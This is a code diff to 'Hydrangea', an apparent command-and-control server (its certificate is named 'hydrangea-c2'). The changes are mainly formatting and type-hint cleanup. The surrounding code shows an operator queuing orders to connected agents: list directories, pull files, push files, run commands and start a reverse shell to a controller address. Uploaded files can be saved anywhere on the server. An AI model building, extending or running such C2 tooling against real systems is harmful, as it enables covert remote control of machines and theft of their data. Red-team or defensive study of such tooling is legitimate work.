@@ -5,18 +5,18 @@ import asyncio
 import hashlib
 import json
 import logging
+import logging.handlers
 import os
 import shutil
 import ssl
 import subprocess
 import time
 import uuid
-from typing import Any, Dict, Optional, Set
-import logging.handlers
+from typing import Any
 
 __version__ = "4.0"
 
-from .utils.common import read_frame, write_frame, ProtocolError, safe_join
+from .utils.common import ProtocolError, read_frame, safe_join, write_frame
 
 logging.basicConfig(
     level=logging.INFO,
@@ -24,14 +24,13 @@ logging.basicConfig(
 )
 file_handler = logging.FileHandler("hydrangea_server.log")
 file_handler.setLevel(logging.INFO)
-file_handler.setFormatter(
-    logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")
-)
+file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
 logging.getLogger().addHandler(file_handler)
 log = logging.getLogger("hydrangea.server")
 
 
 # ── TLS helpers ───────────────────────────────────────────────────────────────
+
 
 def _gen_self_signed_cert(cert_path: str, key_path: str) -> None:
     """Generate a self-signed cert + key via openssl (RSA-2048, 10-year validity)."""
@@ -43,9 +42,20 @@ def _gen_self_signed_cert(cert_path: str, key_path: str) -> None:
     try:
         subprocess.run(
             [
-                "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
-                "-keyout", key_path, "-out", cert_path,
-                "-days", "3650", "-subj", "/CN=hydrangea-c2",
+                "openssl",
+                "req",
+                "-x509",
+                "-newkey",
+                "rsa:2048",
+                "-nodes",
+                "-keyout",
+                key_path,
+                "-out",
+                cert_path,
+                "-days",
+                "3650",
+                "-subj",
+                "/CN=hydrangea-c2",
             ],
             check=True,
             capture_output=True,
@@ -76,10 +86,10 @@ class ClientSession:
         self.writer = writer
         self.port = port
         self.peer = peer
-        self.queue: "asyncio.Queue[dict]" = asyncio.Queue(maxsize=256)
+        self.queue: asyncio.Queue[dict] = asyncio.Queue(maxsize=256)
         self.alive = True
         self.last_seen: float = time.time()
-        self.pump_task: Optional[asyncio.Task] = None
+        self.pump_task: asyncio.Task | None = None
 
 
 class Server:
@@ -91,7 +101,7 @@ class Server:
         storage: str,
         admin_token: str,
         agent_tokens: set,
-        ssl_ctx: Optional[ssl.SSLContext] = None,
+        ssl_ctx: ssl.SSLContext | None = None,
     ):
         self.host = host
         self.admin_port = admin_port
@@ -101,15 +111,15 @@ class Server:
         self.agent_tokens: set = set(agent_tokens)
         # Per-port exclusive token sets. When a port has an entry here, ONLY those
         # tokens are accepted on that port (global agent_tokens are bypassed).
-        self.port_token_map: Dict[int, set] = {}
+        self.port_token_map: dict[int, set] = {}
         self.ssl_ctx = ssl_ctx
         os.makedirs(self.storage, exist_ok=True)
-        self.clients: Dict[str, ClientSession] = {}
+        self.clients: dict[str, ClientSession] = {}
         self.servers: list[asyncio.base_events.Server] = []
-        self.pending: Dict[str, asyncio.Future] = {}
+        self.pending: dict[str, asyncio.Future] = {}
         # Maps client_id -> set of req_ids currently waiting for that client.
         # Used to cancel futures immediately when the client disconnects.
-        self.client_futures: Dict[str, Set[str]] = {}
+        self.client_futures: dict[str, set[str]] = {}
         self.log_buffer = logging.handlers.MemoryHandler(capacity=100, target=None)
         logging.getLogger().addHandler(self.log_buffer)
 
@@ -123,11 +133,13 @@ class Server:
         def _make_admin_handler(p: int):
             async def _h(r: asyncio.StreamReader, w: asyncio.StreamWriter):
                 await self.handle_admin_port(r, w, p)
+
             return _h
 
         def _make_agent_handler(p: int):
             async def _h(r: asyncio.StreamReader, w: asyncio.StreamWriter):
                 await self.handle_agent_port(r, w, p)
+
             return _h
 
         srv = await asyncio.start_server(
@@ -213,7 +225,7 @@ class Server:
         self,
         reader: asyncio.StreamReader,
         writer: asyncio.StreamWriter,
-        header: Dict[str, Any],
+        header: dict[str, Any],
         port: int,
     ):
         peer = writer.get_extra_info("peername")
@@ -226,9 +238,7 @@ class Server:
 
         # Handle test connections separately
         if client_id.startswith("test-connection"):
-            await write_frame(
-                writer, {"type": "REGISTERED", "server_version": __version__}
-            )
+            await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
             log.info(f":{port} test connection: {client_id} from {peer}")
             writer.close()
             await writer.wait_closed()
@@ -303,17 +313,13 @@ class Server:
                         if rel and os.path.isabs(rel):
                             # Absolute save path: respect it (write anywhere on server)
                             dest_path = os.path.realpath(rel)
-                            os.makedirs(
-                                os.path.dirname(dest_path) or "/", exist_ok=True
-                            )
+                            os.makedirs(os.path.dirname(dest_path) or "/", exist_ok=True)
                         else:
                             # Relative: keep it under server_storage/<client_id>/
                             dest_dir = os.path.join(self.storage, client_id)
                             os.makedirs(dest_dir, exist_ok=True)
                             dest_path = safe_join(dest_dir, rel or "file.bin")
-                            os.makedirs(
-                                os.path.dirname(dest_path) or dest_dir, exist_ok=True
-                            )
+                            os.makedirs(os.path.dirname(dest_path) or dest_dir, exist_ok=True)
 
                         with open(dest_path, "wb") as f:
                             f.write(payload or b"")
@@ -322,9 +328,7 @@ class Server:
                             f"[{client_id}] Received file -> {dest_path} "
                             f"({len(payload or b'')} bytes, sha256={header.get('sha256')})"
                         )
-                        await write_frame(
-                            writer, {"type": "ACK", "ack": "FILE", "save_as": rel}
-                        )
+                        await write_frame(writer, {"type": "ACK", "ack": "FILE", "save_as": rel})
                     except Exception as e:
                         # Do not drop the client session; just log the error.
                         log.exception(f"[{client_id}] Failed saving incoming FILE: {e}")
@@ -388,9 +392,7 @@ class Server:
             while session.alive:
                 try:
                     order = await session.queue.get()
-                    await write_frame(
-                        session.writer, order["header"], order.get("payload", b"")
-                    )
+                    await write_frame(session.writer, order["header"], order.get("payload", b""))
                 except asyncio.CancelledError:
                     break
                 except Exception as e:
@@ -408,8 +410,7 @@ class Server:
             now = time.time()
             # Identify stale clients before iterating further
             dead = [
-                cid for cid, sess in list(self.clients.items())
-                if now - sess.last_seen > dead_after
+                cid for cid, sess in list(self.clients.items()) if now - sess.last_seen > dead_after
             ]
             for cid in dead:
                 sess = self.clients.get(cid)
@@ -446,7 +447,7 @@ class Server:
         self,
         reader: asyncio.StreamReader,
         writer: asyncio.StreamWriter,
-        header: Dict[str, Any],
+        header: dict[str, Any],
         payload: bytes,
     ):
         action = header.get("action")
@@ -467,21 +468,22 @@ class Server:
             "add_agent_port",
             "server_config",
         }:
-            await write_frame(
-                writer, {"type": "ERROR", "error": "unknown_admin_action"}
-            )
+            await write_frame(writer, {"type": "ERROR", "error": "unknown_admin_action"})
             writer.close()
             await writer.wait_closed()
             return
 
         if action == "clients":
-            await write_frame(writer, {
-                "type": "CLIENTS",
-                "clients": [
-                    {"id": s.client_id, "port": s.port, "peer": s.peer}
-                    for s in self.clients.values()
-                ],
-            })
+            await write_frame(
+                writer,
+                {
+                    "type": "CLIENTS",
+                    "clients": [
+                        {"id": s.client_id, "port": s.port, "peer": s.peer}
+                        for s in self.clients.values()
+                    ],
+                },
+            )
             writer.close()
             await writer.wait_closed()
             return
@@ -535,9 +537,7 @@ class Server:
                     stderr=asyncio.subprocess.PIPE,
                 )
                 try:
-                    stdout_b, stderr_b = await asyncio.wait_for(
-                        proc.communicate(), timeout=timeout
-                    )
+                    stdout_b, stderr_b = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                 except asyncio.TimeoutError:
                     try:
                         proc.kill()
@@ -610,10 +610,13 @@ class Server:
                 return
             bind_token = header.get("agent_token")
             try:
+
                 def _make_dyn_handler(p: int):
                     async def _h(r: asyncio.StreamReader, w: asyncio.StreamWriter):
                         await self.handle_agent_port(r, w, p)
+
                     return _h
+
                 srv = await asyncio.start_server(
                     _make_dyn_handler(new_port), self.host, new_port, ssl=self.ssl_ctx
                 )
@@ -627,11 +630,14 @@ class Server:
                 else:
                     binding = "global"
                     log.info(f"Agent port :{new_port} opened (global tokens)")
-                await write_frame(writer, {
-                    "type": "OK",
-                    "port": new_port,
-                    "token_binding": binding,
-                })
+                await write_frame(
+                    writer,
+                    {
+                        "type": "OK",
+                        "port": new_port,
+                        "token_binding": binding,
+                    },
+                )
             except OSError as exc:
                 log.warning(f"Failed to open agent port :{new_port}: {exc}")
                 await write_frame(writer, {"type": "ERROR", "error": str(exc)})
@@ -640,8 +646,10 @@ class Server:
             return
 
         if action == "server_config":
+
             def _mask(t: str) -> str:
                 return t[:3] + "***" if len(t) > 3 else "***"
+
             config = {
                 "type": "SERVER_CONFIG",
                 "admin_port": self.admin_port,
@@ -679,14 +687,10 @@ class Server:
                 order = {"header": {"type": "LIST_DIR", "path": path, "req_id": req_id}}
                 await session.queue.put(order)
                 try:
-                    res_header, res_payload = await asyncio.wait_for(
-                        fut, timeout=timeout
-                    )
+                    res_header, res_payload = await asyncio.wait_for(fut, timeout=timeout)
                     await write_frame(writer, res_header, res_payload)
                 except asyncio.TimeoutError:
-                    await write_frame(
-                        writer, {"type": "ERROR", "error": "timeout", "path": path}
-                    )
+                    await write_frame(writer, {"type": "ERROR", "error": "timeout", "path": path})
                 finally:
                     self.pending.pop(req_id, None)
                 writer.close()
@@ -695,9 +699,7 @@ class Server:
             else:
                 order = {"header": {"type": "LIST_DIR", "path": path}}
                 await session.queue.put(order)
-                await write_frame(
-                    writer, {"type": "QUEUED", "order": "list", "path": path}
-                )
+                await write_frame(writer, {"type": "QUEUED", "order": "list", "path": path})
                 writer.close()
                 await writer.wait_closed()
                 return
@@ -711,9 +713,7 @@ class Server:
                 writer.close()
                 await writer.wait_closed()
                 return
-            order = {
-                "header": {"type": "PULL_FILE", "src_path": src, "save_as": save_as}
-            }
+            order = {"header": {"type": "PULL_FILE", "src_path": src, "save_as": save_as}}
             await session.queue.put(order)
             await write_frame(
                 writer,
@@ -728,9 +728,7 @@ class Server:
             dest = header.get("dest")
             src_name = header.get("src_name")
             if dest is None:
-                await write_frame(
-                    writer, {"type": "ERROR", "error": "missing_dest_or_payload"}
-                )
+                await write_frame(writer, {"type": "ERROR", "error": "missing_dest_or_payload"})
                 writer.close()
                 await writer.wait_closed()
                 return
@@ -782,9 +780,7 @@ class Server:
             }
             await session.queue.put(order)
             try:
-                res_header, res_payload = await asyncio.wait_for(
-                    fut, timeout=timeout + 1.0
-                )
+                res_header, res_payload = await asyncio.wait_for(fut, timeout=timeout + 1.0)
                 await write_frame(writer, res_header, res_payload)
             except asyncio.TimeoutError:
                 await write_frame(writer, {"type": "ERROR", "error": "timeout"})
@@ -842,9 +838,7 @@ class Server:
         if action == "reverse_shell":
             controller_addr = header.get("controller_addr")
             if not controller_addr:
-                await write_frame(
-                    writer, {"type": "ERROR", "error": "missing_controller_addr"}
-                )
+                await write_frame(writer, {"type": "ERROR", "error": "missing_controller_addr"})
                 writer.close()
                 await writer.wait_closed()
                 return
@@ -854,9 +848,7 @@ class Server:
                 await writer.wait_closed()
                 return
             session = self.clients[target]
-            order = {
-                "header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}
-            }
+            order = {"header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}}
             await session.queue.put(order)
             await write_frame(
                 writer,
@@ -891,46 +883,55 @@ async def amain():
     ap = argparse.ArgumentParser(description="Hydrangea server")
     ap.add_argument("--host", default="0.0.0.0", help="Bind address")
     ap.add_argument(
-        "--admin-port", type=int, required=True,
+        "--admin-port",
+        type=int,
+        required=True,
         help="Port for controller (admin) connections",
     )
     ap.add_argument(
-        "--ports", nargs="+", type=int, required=True,
+        "--ports",
+        nargs="+",
+        type=int,
+        required=True,
         help="Port(s) for agent connections (space-separated)",
     )
     ap.add_argument(
-        "--storage", default="./server_storage",
+        "--storage",
+        default="./server_storage",
         help="Directory to store incoming files",
     )
     ap.add_argument(
-        "--admin-token", required=True,
+        "--admin-token",
+        required=True,
         help="Auth token for controller connections",
     )
     ap.add_argument(
-        "--agent-token", action="append", dest="agent_tokens", metavar="TOKEN",
+        "--agent-token",
+        action="append",
+        dest="agent_tokens",
+        metavar="TOKEN",
         default=[],
         help="Allowed auth token for agent connections (repeatable); omit to configure at runtime",
     )
     ap.add_argument("--tls-cert", default=None, metavar="PEM", help="TLS certificate file")
-    ap.add_argument("--tls-key",  default=None, metavar="PEM", help="TLS private key file")
+    ap.add_argument("--tls-key", default=None, metavar="PEM", help="TLS private key file")
     ap.add_argument(
-        "--tls-auto", action="store_true",
+        "--tls-auto",
+        action="store_true",
         help="Auto-generate a self-signed TLS cert (requires openssl in PATH)",
     )
 
     args = ap.parse_args()
 
     # ── TLS setup ─────────────────────────────────────────────────────────────
-    ssl_ctx: Optional[ssl.SSLContext] = None
-    tls_fingerprint: Optional[str] = None
+    ssl_ctx: ssl.SSLContext | None = None
+    tls_fingerprint: str | None = None
 
     if args.tls_auto or (args.tls_cert and args.tls_key):
         cert_path = args.tls_cert or "hydrangea.crt"
-        key_path  = args.tls_key  or "hydrangea.key"
+        key_path = args.tls_key or "hydrangea.key"
         try:
-            if args.tls_auto and (
-                not os.path.exists(cert_path) or not os.path.exists(key_path)
-            ):
+            if args.tls_auto and (not os.path.exists(cert_path) or not os.path.exists(key_path)):
                 _gen_self_signed_cert(cert_path, key_path)
             ssl_ctx = _make_ssl_context(cert_path, key_path)
             tls_fingerprint = _cert_fingerprint(cert_path)
@@ -947,15 +948,19 @@ async def amain():
     print(f"  Host           {args.host}")
     print(f"  Admin port     :{args.admin_port}  (controller only)")
     print(f"  Agent ports    {', '.join(f':{p}' for p in args.ports)}")
-    token_note = f"{len(args.agent_tokens)} configured" if args.agent_tokens else "none — add via controller before agents connect"
+    token_note = (
+        f"{len(args.agent_tokens)} configured"
+        if args.agent_tokens
+        else "none — add via controller before agents connect"
+    )
     print(f"  Agent tokens   {token_note}")
     print(f"  Storage        {args.storage}")
     if ssl_ctx:
-        print(f"  TLS            enabled")
+        print("  TLS            enabled")
         print(f"  Cert           {cert_path}")
         print(f"  Fingerprint    {tls_fingerprint}")
     else:
-        print(f"  TLS            disabled  (pass --tls-auto or --tls-cert/--tls-key to enable)")
+        print("  TLS            disabled  (pass --tls-auto or --tls-cert/--tls-key to enable)")
     print()
 
     srv = Server(
